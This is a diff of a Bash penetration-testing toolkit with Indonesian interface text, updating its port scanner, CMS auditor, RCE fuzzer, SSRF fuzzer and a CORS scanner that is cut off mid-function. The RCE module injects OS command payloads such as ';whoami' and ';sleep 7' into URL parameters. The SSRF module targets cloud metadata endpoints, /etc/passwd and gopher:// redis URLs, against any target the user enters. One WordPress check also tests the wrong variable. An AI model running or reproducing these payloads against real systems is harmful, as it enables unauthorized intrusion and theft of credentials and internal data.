@@ -847,23 +847,25 @@ function start_port_scanner {
     local nama_modul="PORT SCANNER"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 08: PORT SCANNER & SERVICE DISCOVERY                  "
-    echo -e "=============================================================================${NC}"
-    echo -e "${INFO} Memeriksa pintu masuk (port) yang terbuka dan layanan yang berjalan."
+    echo -e "                ${W}${BOLD}MODUL 08: PORT SCANNER & SERVICE DISCOVERY${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Memeriksa pintu masuk (port) aktif dan identifikasi layanan."
     echo "-----------------------------------------------------------------------------"
 
     echo -ne "${Q} Masukkan IP atau Domain Target: ${W}"
     read target
-
-    if [[ -z "$target" ]]; then
-        echo -e "${ERR} Target tidak boleh kosong!"; return
-    fi
+    if [[ -z "$target" ]]; then echo -e "${ERR} Target Kosong!"; return; fi
 
     # Format Nama File Log Aman
     local target_clean=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
     local filename="${target_clean^^}_PORT_SCAN.txt"
 
+    # List Port (Common Ports)
     ports=(21 22 23 25 53 80 110 143 443 445 1433 1521 3306 3389 5432 8080 8443)
+    
+    total=${#ports[@]}
+    found_ports=0
+    current=1
 
     echo -e "\n${INFO} Memulai pemindaian pada: ${W}$target"
     echo -e "${INFO} File Log: ${DG}$filename${NC}"
@@ -871,954 +873,1084 @@ function start_port_scanner {
 
     # Inisialisasi Header Tabel di Log
     {
-        echo "====================================================="
-        echo "          PORT SCANNING & SERVICE REPORT             "
-        echo "====================================================="
-        echo "TARGET : $target"
-        echo "DATE   : $(date)"
-        echo "-----------------------------------------------------"
+        echo "PORT SCANNING & SERVICE REPORT - $target"
+        echo "DATE : $(date)"
+        echo "---------------------------------------------------------------------------"
         printf "%-10s | %-15s | %-20s\n" "PORT" "STATUS" "SERVICE"
-        echo "-----------------------------------------------------"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    found_ports=0
+    # --- SCANNING LOOP ---
     for port in "${ports[@]}"; do
-        echo -ne "  ${INFO} Checking Port: ${C}$port ${NC}\r"
+        # Visual Progress Bar (Persis Modul 6 & 7)
+        percent=$(( current * 100 / total ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Progress: [${Y}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"
 
-        # Cek Koneksi TCP menggunakan Bash built-in
+        # Cek Koneksi TCP
         (timeout 1 bash -c "echo > /dev/tcp/$target/$port") >/dev/null 2>&1
         result=$?
 
         if [ $result -eq 0 ]; then
+            # Service Identification
             case $port in
                 21) service="FTP" ;;
                 22) service="SSH" ;;
+                23) service="TELNET" ;;
                 25) service="SMTP" ;;
                 53) service="DNS" ;;
                 80) service="HTTP" ;;
+                110) service="POP3" ;;
+                143) service="IMAP" ;;
                 443) service="HTTPS" ;;
-                445) service="SMB (Windows)" ;;
-                3306) service="MySQL/MariaDB" ;;
-                3389) service="Remote Desktop" ;;
-                8080|8443) service="Web Alternative" ;;
-                *) service="Unknown" ;;
+                445) service="SMB/SAMBA" ;;
+                1433) service="MSSQL" ;;
+                1521) service="ORACLE" ;;
+                3306) service="MYSQL" ;;
+                3389) service="RDP" ;;
+                5432) service="POSTGRESQL" ;;
+                8080|8443) service="HTTP-ALT" ;;
+                *) service="UNKNOWN" ;;
             esac
             
-            res_status="OPEN"
-            echo -e "  ${OK} Port ${W}$port ${NC}-> ${G}${BOLD}$res_status${NC} ${DG}($service)${NC}"
+            # Output Detail saat port terbuka
+            echo -e "\n  ${OK} ${G}PORT OPEN:${NC} ${W}$port${NC}"
+            echo -e "      ╰─> Service: ${P}$service${NC} | Protocol: ${C}TCP${NC}"
+            
+            printf "%-10s | %-15s | %-20s\n" "$port" "OPEN" "$service" >> "$filename"
             ((found_ports++))
-        else
-            res_status="CLOSED/FILTERED"
-            service="-"
         fi
 
-        # Tulis ke tabel log hanya jika OPEN agar log ringkas
-        if [[ "$res_status" == "OPEN" ]]; then
-            printf "%-10s | %-15s | %-20s\n" "$port" "$res_status" "$service" >> "$filename"
-        fi
+        ((current++))
+        sleep 0.05 # Delay halus agar progress bar terlihat bergerak
     done
 
-    echo -ne "                                                                                \r"
-    echo -e "\n-----------------------------------------------------------------------------"
-    
+    # --- FINAL REPORT ---
+    echo -ne "\r                                                                                                    \r"
+    echo -e "-----------------------------------------------------------------------------"
     if [ $found_ports -gt 0 ]; then
-        echo -e "${OK} ${G}${BOLD}Scan Selesai! $found_ports port aktif ditemukan.${NC}"
-        echo "KESIMPULAN: DITEMUKAN $found_ports PORT TERBUKA" >> "$filename"
+        echo -e "${OK} ${G}${BOLD}SELESAI! $found_ports port aktif ditemukan.${NC}"
+        echo "---------------------------------------------------------------------------" >> "$filename"
+        echo "TOTAL OPEN PORTS: $found_ports" >> "$filename"
     else
-        echo -e "${ERR} ${R}Scan Selesai. Tidak ada port umum yang terbuka.${NC}"
-        echo "KESIMPULAN: TIDAK ADA PORT UMUM YANG TERDETEKSI" >> "$filename"
+        echo -e "${ERR} ${R}Tidak ada port umum yang terbuka.${NC}"
     fi
     
-    echo -e "\n${INFO} Laporan audit tersimpan di: ${DG}$filename"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
+    echo -e "${INFO} Laporan audit: ${DG}$filename${NC}"
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"
     read
 }
 function start_cms_scanner {
     clear
-    local nama_modul="CMS SCANNER"
+    local nama_modul="CMS SCANNER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 09: CMS IDENTIFIER & VULN CHECKER                     "
-    echo -e "=============================================================================${NC}"
-    echo -e "${INFO} Mengidentifikasi CMS dan mencari kelemahan konfigurasi umum."
-    echo "-----------------------------------------------------------------------------"
+    echo -e "                ${W}${BOLD}MODUL 09: CMS IDENTIFIER & DEEP AUDIT PRO${NC}                    "
+    echo -e "${C}=============================================================================${NC}"
 
-    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
-    read target
-
-    if [[ -z "$target" ]]; then
-        echo -e "${ERR} URL tidak boleh kosong!"; return
-    fi
-
+    echo -ne "${Q} Masukkan URL Target: ${W}"; read target
+    [[ -z "$target" ]] && return
     [[ "${target: -1}" != "/" ]] && target="$target/"
 
-    # --- LOGIKA PENAMAAN FILE AMAN ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_CMS_AUDIT.txt"
+    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_CMS_PRO.txt"
+    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
-    
-    echo -e "\n${INFO} Menganalisis target: ${W}$target"
-    echo -e "${INFO} File Log: ${DG}$filename${NC}"
+    echo -e "\n${INFO} Memulai Analisis Heuristik pada: ${W}$target"
     echo "-----------------------------------------------------------------------------"
 
-    # Inisialisasi Header Log
+    # 1. LOGIKA DETEKSI MULTI-LAYER (Headers + Body + Files)
+    # Kita ambil Header dan Body secara terpisah untuk efisiensi
+    local resp_headers=$(curl -s -I -k -L -A "$ua" --connect-timeout 10 "$target")
+    local resp_body=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target" | head -n 500) # Cek 500 baris pertama saja
+
+    cms_found="Unknown"
+    
+    # Deteksi via HTTP Headers (Paling Akurat/Cepat)
+    if echo "$resp_headers" | grep -qi "X-Powered-By: PHP"; then php_version="Detected"; fi
+    if echo "$resp_headers" | grep -qi "WP-Engine"; then cms_found="WordPress (Managed)"; fi
+    
+    # Deteksi via Signature Logic
+    declare -A cms_sigs=(
+        ["WordPress"]="wp-content|wp-includes|xmlrpc.php"
+        ["Joomla"]="joomla|option=com_|Joomla!"
+        ["Drupal"]="Drupal.settings|sites/all|drupal.js"
+        ["Magento"]="Mage.Cookies|/static/frontend/|magento"
+        ["Laravel"]="XSRF-TOKEN|laravel_session|/_debugbar/"
+    )
+
+    for cms in "${!cms_sigs[@]}"; do
+        if echo "$resp_body" | grep -qiE "${cms_sigs[$cms]}"; then
+            cms_found="$cms"
+            break
+        fi
+    done
+
+    echo -e "  ${OK} CMS Terdeteksi: ${G}${BOLD}$cms_found${NC}"
+
+    # 2. LOGIKA AUDIT BERDASARKAN TIPE CMS
+    findings=0
     {
-        echo "====================================================="
-        echo "          CMS IDENTIFICATION & AUDIT REPORT          "
-        echo "====================================================="
-        echo "TARGET : $target"
-        echo "DATE   : $(date)"
-        echo "-----------------------------------------------------"
-        printf "%-30s | %-20s\n" "COMPONENTS / PATH" "STATUS / FINDING"
+        echo "CMS DEEP AUDIT REPORT - $target"
         echo "-----------------------------------------------------"
     } > "$filename"
 
-    # 1. Identifikasi CMS Dasar
-    page_source=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target")
-    
-    cms_found="Unknown"
-    [[ "$page_source" == *"wp-content"* ]] && cms_found="WordPress"
-    [[ "$page_source" == *"joomla"* ]] && cms_found="Joomla"
-    [[ "$page_source" == *"Drupal"* ]] && cms_found="Drupal"
-    [[ "$page_source" == *"Laravel"* ]] && cms_found="Laravel (Framework)"
+    case "$cms_found" in
+        "WordPress")
+            echo -e "${INFO} Menjalankan WP-Specific Security Audit..."
+            
+            # Logic: Cek Version via Meta Generator
+            wp_ver=$(echo "$resp_body" | grep -Po '(?<=content="WordPress )[^"]*')
+            [[ -n "$wp_ver" ]] && echo -e "  ${INFO} Version: ${Y}$wp_ver${NC}" && echo "WP Version: $wp_ver" >> "$filename"
 
-    echo -e "  ${OK} Identifikasi CMS: ${G}${BOLD}$cms_found${NC}"
-    printf "%-30s | %-20s\n" "CMS Core" "$cms_found" >> "$filename"
+            # Logic: XML-RPC Attack Surface
+            if [[ $(curl -s -k -o /dev/null -w "%{http_code}" "$target/xmlrpc.php") == "405" ]]; then
+                echo -e "  ${WARN} ${R}CRITICAL:${NC} XML-RPC Vulnerable (Method Allowed)"
+                ((findings++))
+            fi
 
-    # 2. Cek Kerentanan Spesifik (WordPress sebagai contoh utama)
-    findings=0
-    if [[ "$cms_found" == "WordPress" ]]; then
-        # Cek XML-RPC
-        xml_check=$(curl -s -o /dev/null -w "%{http_code}" -k "$target/xmlrpc.php")
-        if [[ "$xml_check" == "200" || "$xml_check" == "405" ]]; then
-            echo -e "  ${ERR} ${Y}Vulnerability:${NC} XML-RPC Aktif (Potensi Brute Force/DoS)"
-            printf "%-30s | %-20s\n" "/xmlrpc.php" "ENABLED (VULN)" >> "$filename"
-            ((findings++))
-        fi
+            # Logic: REST API Exposure (User Leak)
+            user_leak=$(curl -s -k "$target/wp-json/wp/v2/users" | grep -Po '"slug":"\K[^"]*')
+            if [[ -n "$user_count" ]]; then
+                echo -e "  ${WARN} ${R}VULN:${NC} REST API User Leak: ${Y}$user_leak${NC}"
+                ((findings++))
+            fi
 
-        # Cek Directory Listing Uploads
-        up_check=$(curl -s -k "$target/wp-content/uploads/" | grep -i "Index of")
-        if [[ -n "$up_check" ]]; then
-            echo -e "  ${ERR} ${Y}Vulnerability:${NC} Directory Listing di Uploads Terbuka"
-            printf "%-30s | %-20s\n" "/wp-content/uploads/" "OPEN (SENSITIVE)" >> "$filename"
-            ((findings++))
-        fi
-    fi
+            # Logic: License Path Disclosure
+            if [[ $(curl -s -k -o /dev/null -w "%{http_code}" "$target/license.txt") == "200" ]]; then
+                echo -e "  ${WARN} ${Y}INFO:${NC} Sensitive File Exposed: license.txt"
+                ((findings++))
+            fi
+            ;;
 
-    if [ $findings -eq 0 ]; then
-        echo -e "  ${OK} Tidak ditemukan miskonfigurasi CMS standar."
-        printf "%-30s | %-20s\n" "Security Patches" "SEEMS SECURE" >> "$filename"
-    fi
+        "Laravel")
+            echo -e "${INFO} Menjalankan Laravel Security Audit..."
+            # Logic: Debug Mode Check
+            if curl -s -k "$target" | grep -qi "Environment Variables"; then
+                echo -e "  ${WARN} ${R}CRITICAL:${NC} APP_DEBUG is ON"
+                ((findings++))
+            fi
+            ;;
+            
+        *)
+            # Logic: Generic Header Security Audit
+            echo -e "${INFO} Menjalankan Generic Security Headers Audit..."
+            for header in "X-Frame-Options" "Content-Security-Policy" "X-Content-Type-Options"; do
+                if ! echo "$resp_headers" | grep -qi "$header"; then
+                    echo -e "  ${WARN} ${Y}MISSING:${NC} $header (Security Best Practice)"
+                fi
+            done
+            ;;
+    esac
 
-    echo -e "\n-----------------------------------------------------------------------------"
-    echo "-----------------------------------------------------" >> "$filename"
-    echo "KESIMPULAN: AUDIT CMS SELESAI" >> "$filename"
-    
-    echo -e "${INFO} Laporan audit CMS tersimpan di: ${DG}$filename"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    echo -e "-----------------------------------------------------------------------------"
+    echo -e "${OK} Scan Selesai. Ditemukan ${G}$findings${NC} potensi isu keamanan."
+    echo -e "${INFO} Laporan detail: ${DG}$filename${NC}"
+    echo -ne "\n${Q} Tekan Enter untuk kembali..."; read
 }
 function start_rce_scanner {
     clear
-    local nama_modul="RCE SCANNER"
+    local nama_modul="RCE SCANNER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 10: REMOTE CODE EXECUTION (RCE) SCANNER               "
-    echo -e "=============================================================================${NC}"
-    echo -e "${INFO} Mencoba eksekusi perintah OS (Linux/Windows) via parameter URL."
+    echo -e "                ${W}${BOLD}MODUL 10: REMOTE CODE EXECUTION (RCE) PRO${NC}                    "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Mencoba eksekusi OS Command via Parameter (Direct & Blind Mode)."
     echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan URL Full (contoh: http://site.com/ping.php?host=): ${W}"
-    read target
+    echo -ne "${Q} Masukkan URL Full (cth: http://site.com/exec?cmd=): ${W}"; read target
+    [[ -z "$target" ]] && return
 
-    if [[ -z "$target" ]]; then
-        echo -e "${ERR} URL tidak boleh kosong!"; return
-    fi
-
-    # --- LOGIKA PENAMAAN FILE AMAN ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_RCE_AUDIT.txt"
+    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_RCE_PRO.txt"
+    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-    # Payload RCE Teroptimasi
+    # Kombinasi Payload: Direct Output & Time-Based (Blind)
     rce_payloads=(
-        ";whoami" "|whoami" "&whoami" "\`whoami\`" "\$(whoami)"
-        ";id" "|id" "&id" ";ls -la" "<?php system('whoami'); ?>"
+        ";whoami" "|id" "&whoami" "\$(id)" "\`id\`"
+        ";sleep 7" "|sleep 7" "&sleep 7"
+        "||timeout 7" ";powershell Sleep 7"
     )
 
-    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+    total=${#rce_payloads[@]}
+    found_rce=0
+    current=1
 
-    echo -e "\n${INFO} Memulai Fuzzing RCE pada: ${W}$target"
+    echo -e "\n${INFO} Fuzzing Target: ${W}$target"
     echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
-    # Inisialisasi Header Tabel di Log
     {
-        echo "====================================================="
-        echo "          REMOTE CODE EXECUTION AUDIT REPORT         "
-        echo "====================================================="
-        echo "TARGET : $target"
-        echo "DATE   : $(date)"
-        echo "-----------------------------------------------------"
-        printf "%-25s | %-12s | %-20s\n" "PAYLOAD" "STATUS" "SERVER RESP"
-        echo "-----------------------------------------------------"
+        echo "RCE PRO AUDIT REPORT - $target"
+        echo "DATE : $(date)"
+        echo "---------------------------------------------------------------------------"
+        printf "%-25s | %-12s | %-20s\n" "PAYLOAD" "TYPE" "EVIDENCE"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    found_rce=0
+    # --- SCANNING LOOP ---
     for payload in "${rce_payloads[@]}"; do
-        echo -ne "  ${INFO} Testing: ${C}$payload ${NC}\r"
-        
-        # URL Encode payload menggunakan python3
-        encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$payload")
-        
-        # Kirim request dengan timeout agar tidak hang
-        response=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target$encoded_payload")
+        # Visual Progress Bar (Persis Modul 09)
+        percent=$(( current * 100 / total ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"
 
-        # Cek indikator keberhasilan (mencari string sistem Linux/Unix)
-        if echo "$response" | grep -qiE "uid=|gid=|groups=|www-data|apache|nginx|root|system32|Windows IP Configuration"; then
-            res_status="VULNERABLE"
-            # Ambil potongan respon untuk bukti (evidence)
-            server_resp=$(echo "$response" | grep -iE "uid=|www-data|root|Windows" | head -n 1 | cut -c1-30 | tr -d '\n\r')
-            
-            echo -e "  ${OK} ${R}${BLINK}RCE DETECTED!${NC} -> Payload: ${W}$payload${NC}"
-            echo -e "        Response: ${G}$server_resp${NC}"
+        # Encode & Measure Time
+        encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
+        
+        start_time=$(date +%s)
+        response=$(curl -s -k -L -A "$ua" --connect-timeout 15 "$target$encoded_payload")
+        end_time=$(date +%s)
+        duration=$((end_time - start_time))
+
+        # 1. LOGIKA DETEKSI: DIRECT OUTPUT
+        if echo "$response" | grep -qiE "uid=|gid=|groups=|www-data|apache|root|system32|Windows IP"; then
+            evidence=$(echo "$response" | grep -iE "uid=|www-data|root" | head -n1 | cut -c1-30 | tr -d '\n\r')
+            echo -e "\n  ${OK} ${R}${BLINK}VULNERABLE (Direct):${NC} ${W}$payload${NC}"
+            echo -e "      ╰─> Evidence: ${G}$evidence${NC}"
+            printf "%-25s | %-12s | %-20s\n" "$payload" "DIRECT" "$evidence" >> "$filename"
             ((found_rce++))
-            
-            printf "%-25s | %-12s | %-20s\n" "$payload" "$res_status" "$server_resp" >> "$filename"
-            # Jangan 'break' agar kita tahu payload mana saja yang berhasil
-        else
-            res_status="SECURE"
-            server_resp="-"
-            printf "%-25s | %-12s | %-20s\n" "$payload" "$res_status" "$server_resp" >> "$filename"
+
+        # 2. LOGIKA DETEKSI: BLIND RCE (Time-Based)
+        elif [ "$duration" -ge 7 ] && [ "$duration" -le 12 ]; then
+            # Jika durasi respon >= 7 detik (sesuai payload sleep 7)
+            echo -e "\n  ${OK} ${R}${BLINK}VULNERABLE (Blind):${NC} ${W}$payload${NC}"
+            echo -e "      ╰─> Evidence: ${Y}Time Delay ${duration}s Detected${NC}"
+            printf "%-25s | %-12s | %-20s\n" "$payload" "BLIND" "Delay ${duration}s" >> "$filename"
+            ((found_rce++))
         fi
 
-        sleep 0.2
+        ((current++))
     done
 
-    # Bersihkan baris progress
-    echo -ne "                                                                                \r"
+    # --- FINAL REPORT ---
+    echo -ne "\r                                                                                                    \r"
     echo -e "-----------------------------------------------------------------------------"
-    
     if [ $found_rce -gt 0 ]; then
-        echo -e "${ERR} ${R}${BOLD}[!] ALERT: Server Terbuka! Kendali penuh didapatkan.${NC}"
-        echo "KESIMPULAN: CRITICAL VULNERABILITY FOUND (RCE)" >> "$filename"
+        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Ditemukan $found_rce titik celah RCE!"
     else
-        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan eksekusi perintah langsung.${NC}"
-        echo "KESIMPULAN: NO DIRECT RCE DETECTED" >> "$filename"
+        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan celah RCE umum.${NC}"
     fi
     
-    echo -e "\n${INFO} Hasil audit RCE tersimpan di: ${DG}$filename"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    echo -e "${INFO} Laporan: ${DG}$filename${NC}"
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
+
 function start_ssrf_tester {
     clear
-    local nama_modul="SSRF SCANNER"
+    local nama_modul="SSRF SCANNER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 11: SERVER-SIDE REQUEST FORGERY (SSRF)               "
-    echo -e "=============================================================================${NC}"
-    echo -e "${INFO} Memaksa server mengakses jaringan internal atau metadata cloud."
+    echo -e "                ${W}${BOLD}MODUL 11: SERVER-SIDE REQUEST FORGERY (SSRF) PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Mencoba paksa server mengakses internal network, cloud metadata, & files."
     echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan URL Parameter (contoh: http://site.com/proxy.php?url=): ${W}"
-    read target
+    echo -ne "${Q} Masukkan URL Parameter (cth: http://site.com/proxy.php?url=): ${W}"; read target
+    [[ -z "$target" ]] && return
 
-    if [[ -z "$target" ]]; then
-        echo -e "${ERR} URL tidak boleh kosong!"; return
-    fi
-
-    # --- LOGIKA PENAMAAN FILE AMAN ---
+    # --- LOGIKA PENAMAAN FILE ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_SSRF_AUDIT.txt"
+    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_SSRF_PRO.txt"
+    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-    # Payload SSRF Teroptimasi (Cloud & Local)
+    # SSRF Payload Collection: Cloud, Localhost, Port Scanning, & Protocol Wrapper
     ssrf_payloads=(
         "http://169.254.169.254/latest/meta-data/"
+        "http://169.254.169.254/computeMetadata/v1/"
         "http://metadata.google.internal/computeMetadata/v1/"
         "http://127.0.0.1:22"
         "http://127.0.0.1:3306"
-        "file:///etc/passwd"
         "http://localhost:80"
+        "http://localhost:6379"
+        "file:///etc/passwd"
+        "dict://127.0.0.1:11211"
+        "gopher://127.0.0.1:6379/_INFO"
     )
 
-    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    total=${#ssrf_payloads[@]}
+    found_ssrf=0
+    current=1
 
-    echo -e "\n${INFO} Memulai Penetrasi SSRF pada: ${W}$target"
+    echo -e "\n${INFO} Fuzzing Target: ${W}$target"
     echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     {
-        echo "====================================================="
-        echo "          SSRF VULNERABILITY AUDIT REPORT            "
-        echo "====================================================="
-        echo "TARGET : $target"
-        echo "DATE   : $(date)"
-        echo "-----------------------------------------------------"
-        printf "%-40s | %-15s\n" "INTERNAL RESOURCE TESTED" "STATUS"
-        echo "-----------------------------------------------------"
+        echo "SSRF PRO AUDIT REPORT - $target"
+        echo "DATE : $(date)"
+        echo "---------------------------------------------------------------------------"
+        printf "%-45s | %-15s\n" "PAYLOAD / RESOURCE" "STATUS"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    found_ssrf=0
+    # --- SCANNING LOOP ---
     for payload in "${ssrf_payloads[@]}"; do
-        echo -ne "  ${INFO} Testing: ${C}$payload ${NC}\r"
-        
-        # Kirim request dengan timeout ketat
-        response=$(curl -s -k -L -A "$ua" --connect-timeout 5 "$target$payload")
+        # Visual Progress Bar
+        percent=$(( current * 100 / total ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"
 
-        # Indikator SSRF Berhasil (Pattern Matching)
-        if [[ "$response" == *"ami-id"* || "$response" == *"root:x:"* || "$response" == *"SSH-2.0"* || "$response" == *"computeMetadata"* || "$response" == *"mysql_native_password"* ]]; then
-            res_status="VULNERABLE"
-            echo -e "  ${OK} ${R}${BLINK}SSRF FOUND:${NC} ${W}$payload${NC}"
+        # Encode Payload menggunakan Python (agar karakter khusus seperti '/' di dalam parameter tidak pecah)
+        encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
+        
+        # Eksekusi Request
+        response=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target$encoded_payload")
+
+        # --- LOGIKA DETEKSI KOMPREHENSIF ---
+        # Memeriksa kata kunci spesifik dari berbagai service internal
+        if echo "$response" | grep -qiE "ami-id|instance-id|root:x:|SSH-2.0|mysql_native_password|redis_version|total_connections|auth_token"; then
+            
+            # Identifikasi Evidence singkat
+            evidence="N/A"
+            if [[ "$response" == *"root:x:"* ]]; then evidence="LFI/Passwd Detected"; fi
+            if [[ "$response" == *"ami-id"* ]]; then evidence="AWS Metadata Leak"; fi
+            if [[ "$response" == *"SSH-2.0"* ]]; then evidence="SSH Port Open"; fi
+
+            echo -e "\n  ${OK} ${R}${BLINK}VULNERABLE:${NC} ${W}$payload${NC}"
+            echo -e "      ╰─> Evidence: ${G}$evidence${NC}"
+            printf "%-45s | %-15s\n" "$payload" "VULNERABLE" >> "$filename"
             ((found_ssrf++))
-            printf "%-40s | %-15s\n" "$payload" "$res_status" >> "$filename"
         else
-            res_status="SECURE/TIMEOUT"
-            printf "%-40s | %-15s\n" "$payload" "$res_status" >> "$filename"
+            printf "%-45s | %-15s\n" "$payload" "SECURE" >> "$filename"
         fi
+
+        ((current++))
         sleep 0.1
     done
 
-    echo -ne "                                                                                \r"
+    # --- FINAL REPORT ---
+    echo -ne "\r                                                                                                    \r"
     echo -e "-----------------------------------------------------------------------------"
-    
     if [ $found_ssrf -gt 0 ]; then
-        echo -e "${ERR} ${R}${BOLD}[!] ALERT: Server rentan SSRF! Akses internal terdeteksi.${NC}"
-        echo "KESIMPULAN: CRITICAL VULNERABILITY (SSRF)" >> "$filename"
+        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Ditemukan $found_ssrf titik potensi SSRF!"
     else
-        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan kebocoran data internal.${NC}"
-        echo "KESIMPULAN: NO SSRF LEAKAGE DETECTED" >> "$filename"
+        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan indikasi SSRF yang umum.${NC}"
     fi
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    
+    echo -e "${INFO} Laporan: ${DG}$filename${NC}"
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
 function start_cors_scanner {
     clear
-    local nama_modul="CORS SCANNER"
+    local nama_modul="CORS SCANNER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 12: CORS MISCONFIGURATION SCANNER                     "
-    echo -e "=============================================================================${NC}"
+    echo -e "                ${W}${BOLD}MODUL 12: CORS MISCONFIGURATION SCANNER PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
     echo -e "${INFO} Menguji kebijakan Cross-Origin (Pencurian Session via AJAX)."
     echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan URL API/Web Target: ${W}"
-    read target
-
-    if [[ -z "$target" ]]; then
-        echo -e "${ERR} URL tidak boleh kosong!"; return
-    fi
+    echo -ne "${Q} Masukkan URL API/Web Target: ${W}"; read target
+    [[ -z "$target" ]] && return
 
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_CORS_AUDIT.txt"
+    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_CORS_PRO.txt"
+    local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-    attacker_origin="http://evil-attacker.com"
-    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    # List Origin untuk di-fuzzing
+    origins=(
+        "http://evil.com"
+        "null"
+        "http://${domain}.evil.com"
+        "http://localhost"
+    )
 
-    echo -e "\n${INFO} Memeriksa Header CORS pada: ${W}$target"
+    total=${#origins[@]}
+    current=1
+    found_vuln=0
+
+    echo -e "\n${INFO} Fuzzing Origins pada: ${W}$target"
     echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     {
-        echo "====================================================="
-        echo "          CORS MISCONFIGURATION AUDIT REPORT         "
-        echo "====================================================="
-        echo "TARGET : $target"
-        echo "DATE   : $(date)"
-        echo "-----------------------------------------------------"
-        printf "%-35s | %-25s\n" "CORS HEADER" "VALUE/RESULT"
-        echo "-----------------------------------------------------"
+        echo "CORS PRO AUDIT REPORT - $target"
